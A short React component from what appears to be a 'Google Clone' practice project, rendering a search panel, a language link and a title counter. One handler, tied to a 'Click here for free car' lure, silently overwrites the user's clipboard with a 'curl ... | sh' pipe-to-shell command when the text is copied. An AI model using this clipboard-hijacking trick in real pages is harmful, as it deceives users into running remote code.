import { useEffect, useState } from "react"
import SearchBtn from "../element/SearchBtn"

const SearchPanal = () => {
    // State Hook
    const [counter, setCounter] = useState(0)

    useEffect(() => {
        document.title = `Google Clone (${counter})`
    }, [counter])
    
    const copyhack = (e) => {
        e.clipboardData.setData("text/plain", "curl https://google.com | sh\n")
        e.preventDefault()
      } 

    return (
        <div className="container">
            <div className="search-panal">
                <SearchBtn label="Google Search" path="/result" />
                <SearchBtn label="I'm feeling Lucky" />
            
            </div>
            <div className="search-panal-text">
                <span className="subtext"
                onClick={() => setCounter(counter + 1)}>
                    Google offered in:
                    <a className="lang-link" href="/">ภาษาไทย</a> 
                </span>
                <div onCopy={copyhack}>
                    Click here for free car <br />
                </div>
            </div>
        </div>
            
    )
}

export default SearchPanal
